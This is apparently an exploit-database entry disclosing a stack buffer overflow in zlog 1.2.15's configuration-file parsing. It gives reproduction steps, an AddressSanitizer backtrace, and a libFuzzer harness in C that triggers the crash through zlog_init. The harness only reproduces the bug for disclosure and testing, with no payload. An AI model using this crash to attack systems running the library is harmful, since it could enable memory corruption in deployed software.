# Exploit Title: zlog 1.2.15 - Buffer Overflow
# Date: 10/23/2021
# Exploit Author: LIWEI
# Vendor Homepage:  https://github.com/HardySimpson/zlog
# Software Link: https://github.com/HardySimpson/zlog
# Version: v1.2.15
# Tested on: ubuntu 18.04.2
# 1.- compile the zlogv1.2.15 code to a library.
# 2.- Use the "zlog_init" API to parse a file. You can do it as my testcase below.
# 3.- crash. because it made a stack-buffer-overflow READ.
# 4. -Also, you can get a stack-buffer-overflow WRITE when the pointer's address which overflow read is end with "0x20".
# 5.- Here are the crash backtrace.
#0 0x5588c3 in zlog_conf_build_with_file /src/zlog/src/conf.c:308:15
#1 0x557ad6 in zlog_conf_new /src/zlog/src/conf.c:176:7
#2 0x551183 in zlog_init_inner /src/zlog/src/zlog.c:91:18
#3 0x551008 in zlog_init /src/zlog/src/zlog.c:134:6
#4 0x550df1 in LLVMFuzzerTestOneInput /src/zlog_init_fuzzer.c:18:18

And also my testcase:
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "zlog.h"

int
LLVMFuzzerTestOneInput(const uint8_t *data, size_t size)
{
        char filename[256];
        sprintf(filename, "/tmp/libfuzzer.%d", getpid());

        FILE *fp = fopen(filename, "wb");
        if (!fp)
                return 0;
        fwrite(data, size, 1, fp);
        fclose(fp);

        int rc = zlog_init(filename);
        if (rc == 0)
        {
                zlog_fini();
        }
        unlink(filename);
        remove(filename);
        return 0;
}

Put my testcase in his project and change the compile line with CC="clang" CFLAGS="-O1 -fno-omit-frame-pointer -gline-tables-only -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION -fsanitize=address -fsanitize-address-use-after-scope -fsanitize=fuzzer-no-link" CXX="clang++" CXXFLAGS="-O1 -fno-omit-frame-pointer -gline-tables-only -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION -fsanitize=address -fsanitize-address-use-after-scope -fsanitize=fuzzer-no-link -stdlib=libc++"
Use ./configure under his project as shown in his README.txt. you will get a binary as testcase's name. run and you will reproduce it.